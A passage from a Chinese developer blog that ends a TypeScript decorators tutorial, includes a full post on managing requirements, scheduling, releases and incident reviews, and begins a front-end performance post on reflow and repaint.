<p>单独的参数装饰器能做的事情很有限，它一般都被用于记录可被其它装饰器使用的信息。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// parameter.ts</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">"reflect-metadata"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">required</span>(<span class="params">target: <span class="built_in">Object</span>, propertyKey: <span class="built_in">string</span> | symbol, parameterIndex: <span class="built_in">number</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> existingRequiredParameters: <span class="built_in">number</span>[] = Reflect.getOwnMetadata(<span class="string">'required'</span>, target, propertyKey) || [];</span><br><span class="line">    existingRequiredParameters.push(parameterIndex);</span><br><span class="line">    Reflect.defineMetadata(<span class="string">'required'</span>, existingRequiredParameters, target, propertyKey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params">target: <span class="built_in">any</span>, propertyName: <span class="built_in">string</span>, descriptor: TypedPropertyDescriptor&lt;<span class="built_in">Function</span>&gt;</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> method = descriptor.value!;</span><br><span class="line">   </span><br><span class="line">    descriptor.value = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">let</span> requiredParameters: <span class="built_in">number</span>[] = Reflect.getOwnMetadata(<span class="string">'required'</span>, target, propertyName);</span><br><span class="line">      <span class="keyword">if</span> (requiredParameters) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> parameterIndex of requiredParameters) &#123;</span><br><span class="line">          <span class="keyword">if</span> (parameterIndex &gt;= <span class="built_in">arguments</span>.length || <span class="built_in">arguments</span>[parameterIndex] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Missing required argument."</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> method.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> BugReport &#123;</span><br><span class="line">    <span class="keyword">type</span> = <span class="string">"report"</span>;</span><br><span class="line">    title: <span class="built_in">string</span>;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params">t: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.title = t;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="meta">@validate</span></span><br><span class="line">    print(<span class="meta">@required</span> verbose: <span class="built_in">boolean</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (verbose) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`type: <span class="subst">$&#123;<span class="keyword">this</span>.<span class="keyword">type</span>&#125;</span>\ntitle: <span class="subst">$&#123;<span class="keyword">this</span>.title&#125;</span>`</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">this</span>.title; </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> report = <span class="keyword">new</span> BugReport(<span class="string">'mode error'</span>);</span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; report &#125; = <span class="built_in">require</span>(<span class="string">'./paramerter.js'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(report.print()); <span class="comment">// Error: Missing required argument.</span></span><br></pre></td></tr></table></figure>
<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><ul>
<li>Before/After钩子。</li>
<li>监听属性改变或者方法调用。</li>
<li>对方法的参数做转换。</li>
<li>添加额外的方法和属性。</li>
<li>运行时类型检查。</li>
<li>自动编解码。</li>
<li>依赖注入。</li>
</ul>
<h3 id="使用举例："><a href="#使用举例：" class="headerlink" title="使用举例："></a>使用举例：</h3><ul>
<li><p>日志打印</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>): <span class="title">any</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">target, key, descriptor</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> method = descriptor.value;</span><br><span class="line">    descriptor.value = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'param: '</span>, <span class="built_in">Array</span>.from(<span class="built_in">arguments</span>));</span><br><span class="line">      <span class="keyword">const</span> value = method.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'result: '</span>, value);</span><br><span class="line">      <span class="keyword">return</span> value</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> B &#123;</span><br><span class="line">  <span class="meta">@f</span>()</span><br><span class="line">  say(name: <span class="built_in">string</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">`name is <span class="subst">$&#123;name&#125;</span>`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>鉴权:</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params">user</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">target, key, descriptor</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> originalMethod = descriptor.value; <span class="comment">// 保留原有函数</span></span><br><span class="line">    <span class="keyword">if</span> (!user.isAuth) &#123;</span><br><span class="line">      descriptor.value = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="comment">// 未登录将返回提示</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'当前未登录，请登录!'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      descriptor.value = <span class="function"><span class="keyword">function</span> (<span class="params">...args</span>) </span>&#123; <span class="comment">// 已登录将原有函数</span></span><br><span class="line">        originalMethod.apply(<span class="keyword">this</span>, args);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> descriptor;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@auth</span>(app.user)</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleStar</span>(<span class="params"><span class="keyword">new</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">new</span>.like++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>类型检查</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">"reflect-metadata"</span>;</span><br><span class="line"><span class="keyword">const</span> stringMetaDataTag = <span class="string">"IsString"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">IsString</span>(<span class="params">target: <span class="built_in">Object</span>, propertyKey: <span class="built_in">string</span> | symbol, parameterIndex: <span class="built_in">number</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> existingRequiredParameters: <span class="built_in">number</span>[] = Reflect.getOwnMetadata(stringMetaDataTag, target, propertyKey) || [];</span><br><span class="line">  existingRequiredParameters.push(parameterIndex);</span><br><span class="line">  Reflect.defineMetadata( stringMetaDataTag, existingRequiredParameters, target, propertyKey);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params">target: <span class="built_in">any</span>, propertyName: <span class="built_in">string</span>, descriptor: TypedPropertyDescriptor&lt;<span class="built_in">Function</span>&gt;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> method = descriptor.value!;</span><br><span class="line"> </span><br><span class="line">  descriptor.value = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> stringMetaTags: <span class="built_in">number</span>[] = Reflect.getOwnMetadata(stringMetaDataTag, target, propertyName);</span><br><span class="line">    <span class="keyword">if</span> (stringMetaTags) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> parameterIndex of stringMetaTags) &#123;</span><br><span class="line">        <span class="keyword">const</span> value = <span class="built_in">arguments</span>[parameterIndex];</span><br><span class="line">        <span class="keyword">if</span> (!(value <span class="keyword">instanceof</span> <span class="built_in">String</span> || <span class="keyword">typeof</span> value === <span class="string">'string'</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'not string'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> method.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> A &#123;</span><br><span class="line">    a: <span class="built_in">string</span> = <span class="string">'123'</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@validate</span></span><br><span class="line">    value (<span class="meta">@IsString</span> value: <span class="built_in">string</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(value);</span><br><span class="line">        <span class="keyword">this</span>.a = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>笔者在 后台接口、Js Bridge、React 项目上都有实践过。不得不说，装饰器模式在面向切面编程(AOP)几乎是 “最佳实践”，极大的提升了编程效率。也希望这篇文章能帮助到你😊</p>
<h3 id="npm-包"><a href="#npm-包" class="headerlink" title="npm 包"></a>npm 包</h3><p><a href="https://github.com/typestack/class-validator" target="_blank" rel="noopener">class-validator</a><br><a href="https://github.com/jayphelps/core-decorators" target="_blank" rel="noopener">core-decorators</a><br><a href="https://github.com/nestjs/nest" target="_blank" rel="noopener">Nest 后台框架</a></p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://github.com/tc39/proposal-decorators" target="_blank" rel="noopener">tc39-proposal</a><br><a href="https://www.typescriptlang.org/docs/handbook/decorators.html" target="_blank" rel="noopener">typescript</a><br><a href="https://saul-mirone.github.io/a-complete-guide-to-typescript-decorator/" target="_blank" rel="noopener">a-complete-guide-to-typescript-decorator</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/需求开发/the-skills-of-develop/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="gdccwxx">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gdccwxx">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/需求开发/the-skills-of-develop/" itemprop="url">做需求搞明白这几点，和加班说再见</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-08-23T13:39:15+08:00">
                2021-08-23
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><img src="/需求开发/the-skills-of-develop/xmind.png" alt="xmind"></p>
<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>你是不是接需求后手足无措？是不是天天忙碌，但又效率不高？是不是需求沟通前后不一致，导致重复修改？几年前刚踏入职场生活的我，对此深有体会。经过沉淀，终于搞明白怎么高效开发，高效会议，总结这几点经验：和产品做朋友、需求对齐和排期、需求方案设计与发布上线、事故与复盘。从此高效工作，早早下班。</p>
<h2 id="树立正确的观点"><a href="#树立正确的观点" class="headerlink" title="树立正确的观点"></a>树立正确的观点</h2><p>阅读之前，不妨问问自己，工作的目的是啥？<br>也许每个人有不同的观点。有人觉得事情永远都干不完，不如慢慢做，自己也更轻松。但有种高级的思维方式是：尽自己努力做好每件事情。因为只有好好对工作，升职加薪才会好好对你；只有对工作表现出热情，老板才会对你有信心，才更可能在职场激烈的竞争中脱颖而出。</p>
<h2 id="和产品做朋友"><a href="#和产品做朋友" class="headerlink" title="和产品做朋友"></a>和产品做朋友</h2><p>产品是一群有想象力，能把抽象的事情具体化的人。他们不仅有许多新颖的点子，还能迅速的 get 到你说的想法。和产品同学做朋友不仅能更加顺利的合作，还能开拓视野，增长见识。比如和产品一起坐电梯，他们可能会想为什么要装镜子，而你会想电梯系统是怎么实现的。在不同角度看同一件事情不仅十分有趣，还能扩展更多可能，不妨试试看。</p>
<h3 id="第一手需求"><a href="#第一手需求" class="headerlink" title="第一手需求"></a>第一手需求</h3><p>和产品做朋友，能比别人更快的拿到第一手需求。<br>产品的需求并不是凭空而来，它可能是从竞品、客户需或老板提出的，产品往往是把需求具体化的人。他们更多的关注是需求是怎么实现的。以及联动的功能和异常场景。而开发则会把具体的需求通过编码实现。<br>当然，正因为产品的角度更多的是怎么实现需求，也更容易过于关注需求实现，而把原本用户诉求无限放大，忽略了需求本身。<br>开发拿到第一手需求最好的方式是如何实现需求出发，可以通过哪些方式来解决。也许需求可以不用开发，只需换个角度看问题就能轻松解决。</p>
<p>核心思想:  why</p>
<h2 id="需求对齐和排期"><a href="#需求对齐和排期" class="headerlink" title="需求对齐和排期"></a>需求对齐和排期</h2><h3 id="需求宣讲"><a href="#需求宣讲" class="headerlink" title="需求宣讲"></a>需求宣讲</h3><p><img src="/需求开发/the-skills-of-develop/discuss.png" alt="discuss"><br>需求宣讲是产品与开发、测试把方案内容输出的主要途径。一份需求的宣讲过程，大致可分为需求宣讲前、需求宣讲中、需求宣讲后。遵循一套流程能有效避免踩坑和高效率会议。</p>
<h4 id="需求宣讲前："><a href="#需求宣讲前：" class="headerlink" title="需求宣讲前："></a>需求宣讲前：</h4><p>亚马逊的高管会议，会在开会前半小时阅读会议内容，再根据梳理的疑问进行讨论。<br>阅读需求文档是必不可少的过程。有效的阅读文档，能在需求宣讲时更能提出自己的疑问与观点，能避免前期因为准备不足，导致的会议效率低下。这样的高效工作方式更值得作为打工人的我们借鉴。需求宣讲前可以从：</p>
<ul>
<li>看需求：了解需求的背景，和类似场景其他产品怎么实现的</li>
<li>提疑问：融合 Why、How、What 去思考</li>
<li>给方案：对现有的技术给需求的方案</li>
<li>给排期：给出大概的排期，以 人/天 为单位进行估算</li>
</ul>
<h4 id="需求宣讲中："><a href="#需求宣讲中：" class="headerlink" title="需求宣讲中："></a>需求宣讲中：</h4><p>需求宣讲中主要是对齐方案，解决疑惑。作为开发者期望的是对所有异常场景与方案有大概的了解，且高效会议，一次通过。需求宣讲中围绕：</p>
<ul>
<li>提出疑问：提出会前准备的疑问，并发散出新的疑问</li>
<li>确认需求：和产品、测试方沟通对齐表现和异常场景，最好有录屏作为证据</li>
<li>一次通过：有不确定的点会中立马拉上相关同学对齐，争取一次性通过会议，不开第二次</li>
<li>确认 deadline: 与估算的 人/天 进行匹配，有疑问可向负责人提出</li>
</ul>
<h4 id="需求宣讲后："><a href="#需求宣讲后：" class="headerlink" title="需求宣讲后："></a>需求宣讲后：</h4><p>会议后通常需要结论的沉淀。这样的好处是在不记得需求细节时可以翻看存档来确认细节、防止产品甩锅等。宣讲内容沉淀的方式：</p>
<ul>
<li>录像回放：有问题可将录像回放，找到讨论的地方</li>
<li>会议纪要：将本次的结论、需要跟进的点写下来，发群里，并艾特相关同学</li>
</ul>
<p>会议纪要常用模版：<br>经过与产品方、xx方的沟通，有以下结论与跟进事项：<br>结论：<br>1、xxx<br>跟进事项：<br>1、 xxxx @xxxx 同学<br>辛苦 @xxxx 关注并确认</p>
<p>核心思想: How</p>
<h3 id="目标拆解与甘特图"><a href="#目标拆解与甘特图" class="headerlink" title="目标拆解与甘特图"></a>目标拆解与甘特图</h3><p>有了具体的需求后，就来到了排期缓解。产品同学希望越快越好，而 PM（Project Manager） 会根据版本的时间点排期。也正因为二者的目标不同，会存在 PM 的排期与产品期望时间并不是相同时间点。为了保证需求不因为自己 delay，合理的人力估算和目标拆解变得必不可少。</p>
<h4 id="目标拆解"><a href="#目标拆解" class="headerlink" title="目标拆解"></a>目标拆解</h4><p>好的目标拆解通常会以大目标和小目标来进行拆分。大目标包括需求评审时间、开发时间、联调时间、测试时间、code review 时间、发布时间，以时间节点为颗粒；小目标包括开发进度、联调进度，以每天的事件为颗粒。<br>评估做不完需求该怎么办？</p>
<ul>
<li>需求上：迭代处理，分成本期必保、本期冲刺、本期不做的几种类型</li>
<li>人力上：评估加人能否解决</li>
<li>时间上：deadline delay 还是需求 delay</li>
</ul>
<h4 id="需求拆分的小-tips"><a href="#需求拆分的小-tips" class="headerlink" title="需求拆分的小 tips"></a>需求拆分的小 tips</h4><p>将开发、联调事件拆解，细分到每周、每天的工作。让每天的进度可控，按时完成工作，按时回家。出现进度不可控则周末适当调整下。<br>对目标拆解到具体内容：</p>
<ul>
<li>需求 deadline 倒推出需求开发完成、提测、发布时间点</li>
<li>根据时间点定具体开发内容，每周目标、每日目标</li>
</ul>
<p>小目标拆解后，甘特图就更能显示工作内容和进度了。</p>
<h3 id="甘特图"><a href="#甘特图" class="headerlink" title="甘特图"></a>甘特图</h3><p><img src="/需求开发/the-skills-of-develop/gantt-chart.png" alt="gantt-chart"></p>
<p>甘特图能清晰的知道工作进度。个人使用甘特图能清晰的定好每天的目标，高效工作；多人合作使用甘特图能划分每个人的工作内容以及进度同步。<br>使用甘特图的好处很多，它不仅能直观、定量的看到进度，还能知道预期目标和实际产出的差值，能有效知道进度快、慢的原因。更重要的是有沉淀，有利于需求完成后的回顾，及时几年后看到自己画的甘特图，也能很快的回忆起当时做需求的问题与困难，充当需求快照的作用。</p>
<p>核心思想: When</p>
<h2 id="从方案设计到发布上线"><a href="#从方案设计到发布上线" class="headerlink" title="从方案设计到发布上线"></a>从方案设计到发布上线</h2><p>从方案设计到发布上线，基本属于开发和测试的工作。方案设计能具体量化需求方案，也能有效保证开发进度，这一环节必不可少。开发和测试的有效沟通也能帮助开发找到代码漏洞，避免发布上线后带来的事故，这些环节十分重要。</p>
<h3 id="方案设计"><a href="#方案设计" class="headerlink" title="方案设计"></a>方案设计</h3><p>方案设计有多香，体验过的人都知道。它的好处在于全局的思考需求，比较容易给出全局最优，而不仅仅是局部最优。方案设计不仅在开发阶段起着举足轻重的作用，还对后续维护有很大的便利。方案设计可以围绕这几点写：</p>
<ul>
<li>时间人物：标注需求关键的时间节点和参与方</li>
<li>业内方案：例如业内实现和竞品分析等</li>
<li>方案设计：方案的具体逻辑，包括设计稿、流程图、库表字段等</li>
<li>其他：流程卡点、自我反思或结论留底等<h3 id="处理-bug-的规矩"><a href="#处理-bug-的规矩" class="headerlink" title="处理 bug 的规矩"></a>处理 bug 的规矩</h3>产品是开发的上游，测试是开发的下游。测试同学对产品形态的表现甚至比产品还更关心，多和测试同学沟通，也能让产品有更良好的发展。要和测试做朋友，从来一杯奶茶做起。当然立好规矩也能避免在需求测试过程中增加沟通成本。</li>
<li>提单前：先沟通到底是开发原因还是其他原因，定好责任方与优先级</li>
<li>提单时：必须包含复现路径及截图，最好包含账号信息和录屏</li>
<li>提单后：非必要场景沟通能否降低优先级，不好解决的问题能否转成需求单<h3 id="发布条例"><a href="#发布条例" class="headerlink" title="发布条例"></a>发布条例</h3>流程的建立很大程度上是对人的保护，遵循流程能有效程度上保护自己。</li>
<li>发布计划：列好发布计划，从 MR、代码到配置，使用发布标记记录每个发布时间点</li>
<li>发布透明：需要发的功能、bugfix和压测接口明确知会</li>
<li>做好灰度：发布的功能遵循一定规则灰度</li>
<li>立刻验证：发布后的第一时间线上验证，保证发布功能正常</li>
<li>留守保障：留守一定的时间，保证发布后无明显波动，方便有问题及时响应<br>核心思想: 规矩</li>
</ul>
<h2 id="事故与复盘"><a href="#事故与复盘" class="headerlink" title="事故与复盘"></a>事故与复盘</h2><p>在需求发布过程中，事故难免会发生。及时、正确的处理事故，在职场上是对自己的保护。同样能帮助自己更快的成长，减少相同错误的发生。</p>
<h3 id="透明原则"><a href="#透明原则" class="headerlink" title="透明原则"></a>透明原则</h3><p>事故发生后第一时间向上级汇报，并定时汇报进度，即便是自己闯出来的。遇到事故建议处理方式：</p>
<ul>
<li>事故发生时：<br>1、大群里艾特相关同学及上级，并同时电话上级，确认信息同步完全<br>2、能恢复立刻恢复<br>3、每隔几分钟向上汇报，即使没有进度<br>4、向上级寻求帮助，直到问题解决</li>
<li>事故发生后：反思与沉淀</li>
</ul>
<h3 id="处理事故的五要素"><a href="#处理事故的五要素" class="headerlink" title="处理事故的五要素"></a>处理事故的五要素</h3><ul>
<li>定义问题：能不能量化指标，比如出现路径、指标数据灯</li>
<li>发现问题：能不能有监控，及时和准确的告警</li>
<li>分析问题：能不能有工具辅助，提升分析问题的效率</li>
<li>解决问题：能不能第一时间修复，为用户解决问题</li>
<li>预防问题：能不能补充相关case，保证犯过的错误不再犯</li>
</ul>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>写到这里基本完成了，每个点笔者都亲身经历过也实践过。从“年轻”到“老”程序员，磨平了很多冲动与莽撞，沉淀了各个流程的“最佳实践”。如今带小朋友一起干活，对我而言，也是个全新的阶段。这篇文章也算为上阶段的思考做沉淀吧，也希望帮助到有需要的人。<br>感谢你阅读到这里。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/前端/font-end-optimize/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="gdccwxx">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gdccwxx">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/前端/font-end-optimize/" itemprop="url">前端性能优化</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-11T23:46:04+08:00">
                2019-05-11
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="资源合并与压缩-http请求的过程及潜在的性能优化"><a href="#资源合并与压缩-http请求的过程及潜在的性能优化" class="headerlink" title="资源合并与压缩-http请求的过程及潜在的性能优化"></a>资源合并与压缩-http请求的过程及潜在的性能优化</h3><p>浏览器的一个请求从发送到返回都经历了什么</p>
<p><img src="/前端/font-end-optimize/./page-process.png" alt="http"></p>
<p>思考</p>
<ul>
<li>dns是否可以通过缓存减少dns查询时间？</li>
<li>网络请求的过程走最近的网络环境？</li>
<li>相同的静态资源是否可以缓存？</li>
<li>能否减少请求http请求大小？</li>
<li>减少http请求</li>
<li>服务端渲染<h2 id="重绘和回流"><a href="#重绘和回流" class="headerlink" title="重绘和回流"></a>重绘和回流</h2><h3 id="css会让JavaScript变慢吗"><a href="#css会让JavaScript变慢吗" class="headerlink" title="css会让JavaScript变慢吗"></a>css会让JavaScript变慢吗</h3>一个线程执行JavaScript<br>一个线程执行渲染<br>频繁触发重绘和回流，导致UI渲染频繁，最重导致js变慢<h3 id="啥是重绘和回流"><a href="#啥是重绘和回流" class="headerlink" title="啥是重绘和回流"></a>啥是重绘和回流</h3><h4 id="回流"><a href="#回流" class="headerlink" title="回流"></a>回流</h4></li>
<li>当render tree中的一部分或全部因为元素规模尺寸，布局，隐藏等改变需要重新构建，称作为回流（reflow）</li>
<li>当页面布局和几何属性变化时，就需要回流<h4 id="重绘"><a href="#重绘" class="headerlink" title="重绘"></a>重绘</h4>当render tree中的一些元素需要更新属性，而这些属性只是影响元素外观，风格，而不会影响布局的，比如background-color，则称之为重绘</li>
</ul>
<p>回流一定会重绘，重绘不一定会回流</p>
<h3 id="触发页面重布局的属性"><a href="#触发页面重布局的属性" class="headerlink" title="触发页面重布局的属性"></a>触发页面重布局的属性</h3><ul>
<li>盒子模型相关属性会触发重布局</li>
<li>定位属性及浮动会触发页面重布局</li>
<li>改变节点内部文字结构会触发重布局<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">width			top			text-align</span><br><span class="line">height			bottom		overflow-y</span><br><span class="line">padding			left		font-weight</span><br><span class="line">margin			right		overflow</span><br><span class="line">display			position	font-family</span><br><span class="line">border-width	float		line-height</span><br><span class="line">border			clear		vertical-align</span><br><span class="line">min-height					white-space</span><br><span class="line">							font-size</span><br></pre></td></tr></table></figure>
</li>
</ul>
